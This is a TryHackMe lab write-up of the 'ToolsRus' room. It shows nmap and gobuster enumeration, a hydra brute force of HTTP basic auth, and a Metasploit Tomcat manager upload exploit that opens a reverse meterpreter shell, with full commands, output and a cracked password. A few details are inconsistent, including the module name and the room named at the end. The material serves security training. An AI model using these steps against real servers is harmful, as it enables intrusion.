# ToolsRus
> 4lch3my | March 09, 2023
-------------------
#### This is a machine that allows you to practise web app hacking and privilege escalation
#### [Room Link](https://tryhackme.com/room/toolsrus)

## Tasks
##### 1. ToysRus
  Deploy the machine with the Start Machine button, also either deploy your [Attack Box](https://tryhackme.com/access) OR Connect to [OpenVPN](https://tryhackme.com/access) and deploy your personal KALI machine.
<br>

To start, I use [nmap] which is default option on the perosnal Kali install I have. We start with a basic command `nmap -sC -sV -A MACHINE_IP `
The -sC flag runs scripts against open ports as well to determine if there are external/common vulnerabilities that we can use outright. The -sV probes all open ports it finds to determine if we can get the service/version information. -A outputs in agressive mode, so we can follow along with the commands and enumeration.
In our NMAP results we get:

```
Starting Nmap 7.60 ( https://nmap.org ) at 2023-03-09 00:50 GMT
Nmap scan report for ip-MACHINE_IP.eu-west-1.compute.internal (MACHINE_IP)
Host is up (0.00066s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:99:f5:94:27:2c:18:9e:ad:03:ef:e8:2e:33:48:40 (RSA)
|   256 4c:73:c5:35:de:02:26:07:fe:dd:92:ed:38:2c:3f:7c (ECDSA)
|_  256 49:d0:53:8b:7c:99:a6:21:7d:40:6c:74:9d:b7:90:80 (EdDSA)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
MAC Address: 02:5B:94:C2:14:BD (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=3/9%OT=22%CT=1%CU=40054%PV=Y%DS=1%DC=D%G=Y%M=025B94%TM
OS:=64092D51%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=109%TI=Z%CI=I%TS=8)
OS:SEQ(SP=107%GCD=1%ISR=109%TI=Z%CI=RD%II=I%TS=8)OPS(O1=M2301ST11NW7%O2=M23
OS:01ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)
OS:WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=
OS:6903%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N
OS:)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=
OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
```
We see 4 open ports: `22 - SSH`, `80 - HTTP`, `1234 - HTTP` & `8009 - ajp13` what is an Apache service running. Before we visit the webpages lets run a quick adn dirty `GoBuster` scan with: `gobuster dir -u http://MACHINE_IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`on port 80:

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://MACHINE_IP/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/03/08 23:56:41 Starting gobuster
===============================================================
/guidelines (Status: 301)
/protected (Status: 401)
/server-status (Status: 403)
===============================================================
2023/03/08 23:57:10 Finished
===============================================================
```

And on port `1234`: `gobuster dir -u http://MACHINE_IP:1234/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://MACHINE_IP:1234/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/03/09 01:00:14 Starting gobuster
===============================================================
/docs (Status: 302)
/examples (Status: 302)
/manager (Status: 302)
===============================================================
2023/03/09 01:00:46 Finished
===============================================================
```
Time to visit all the directorys. Let's go!
<br>

Fist the main page: `http://MACHINE_IP/`. Empty!

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20ToolsRUS/images/ToolsRUs.PNG?raw=true)

Next will be: `http://MACHINE_IP/guidelines/`. And we found our username!

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20ToolsRUS/images/bob.PNG?raw=true)

And finally: `http://MACHINE_IP/protected`. We get stopped by an authentication popup asking for a username:password combination. Time for some good old bruteforcing with `hydra`.
<br>

We already know our user, `bob`, `MACHINE_IP`, and `/protected/` directory so we can start a `http-get` attack against our machine with the wordlist of our choise. As this is a `THM machine`, we suspect that the password will be located within the usual `rockyou.txt` file. To to run the attack: `hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.241.174 http-get /protected/`.

```
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
Hydra (http://www.thc.org/thc-hydra) starting at 2023-03-09 00:11:04
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-get://10.10.241.174:80//protected/
[80][http-get] host: 10.10.241.174   login: bob   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2023-03-09 00:11:17
```

Only after a few seconds we find our `password` for the user `bob`. Time to log in to the password protected section of this web server.

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20ToolsRUS/images/rabbit_hole.PNG?raw=true)

And that's the end of that page. Moving on to the `http://MACHINE_IP:1234/`, where we are greated with the `Apache Tomcat/7.0.88` default page.

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20ToolsRUS/images/TomCat.PNG?raw=true)

After a quick `Google` or `ChatGPT` seearch we can see that this app is quite old and has multiple `CVE's` dedicated to it. Seems like the website admin did not update this for a long time. Making our lifes easier I see... Moving on to actually getting on to this machine and grabing the final flag. As instructed by the box, we will use `Metasploit` to answer the last two questions. 
<br>

After switching to the `Metasploit Console` with the command `mfconsole`, we can search for Tomcat vulnerabilities in the databased stored in the app: `msf6 > search Tomcat`

```
Matching Modules
================

   #   Name                                                            Disclosure Date  Rank       Check  Description
   -   ----                                                            ---------------  ----       -----  -----------
   0   auxiliary/dos/http/apache_commons_fileupload_dos                2014-02-06       normal     No     Apache Commons FileUpload and Apache Tomcat DoS
   1   exploit/multi/http/struts_dev_mode                              2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
   2   exploit/multi/http/struts2_namespace_ognl                       2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
   3   exploit/multi/http/struts_code_exec_classloader                 2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
   4   auxiliary/admin/http/tomcat_ghostcat                            2020-02-20       normal     Yes    Apache Tomcat AJP File Read
   5   exploit/windows/http/tomcat_cgi_cmdlineargs                     2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability
   6   exploit/multi/http/tomcat_mgr_deploy                            2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   7   exploit/multi/http/tomcat_mgr_upload                            2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   8   auxiliary/dos/http/apache_tomcat_transfer_encoding              2010-07-09       normal     No     Apache Tomcat Transfer-Encoding Information Disclosure and DoS
   9   auxiliary/scanner/http/tomcat_enum                                               normal     No     Apache Tomcat User Enumeration
   10  exploit/linux/local/tomcat_ubuntu_log_init_priv_esc             2016-09-30       manual     Yes    Apache Tomcat on Ubuntu Log Init Privilege Escalation
```

The 6th `exploit` on the list `/multi/http/tomcat_mgr_deploy` seems to be exactly what we need. Let's switch to it and configure it:

```
msf6 > use exploit/multi/http/tomcat_mgr_uplo
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.10.241.174
RHOSTS => 10.10.241.174
msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT 1234
RPORT => 1234
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword bubbles
HttpPassword => bubbles
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername bob
HttpUsername => bob
```
Now after it is configured correctly, we can run it:

```
msf6 exploit(multi/http/tomcat_mgr_upload) > run

[*] Started reverse TCP handler on HOST_IP:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying l1BnwvSyQFkgg2c8bgBYXr...
[*] Executing l1BnwvSyQFkgg2c8bgBYXr...
[*] Undeploying l1BnwvSyQFkgg2c8bgBYXr ...
[*] Sending stage (58851 bytes) to MACHINE_IP
[*] Undeployed at /manager/html/undeploy
[*] Meterpreter session 1 opened (HOST_IP:4444 -> MACHINE_IP:41378) at 2023-03-09 00:45:54 +0000

meterpreter >
```

Success we have access! We can now grab the flag and complete this room!

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20ToolsRUS/images/flag.PNG?raw=true)

#### Thank you for checking out my writeup about the THM room: RootMe! If you are interested in other writeups of mine or interetsed in some of my codeing work, please feel free to look around my GitHub page! Happy hacking! - 4lch3myí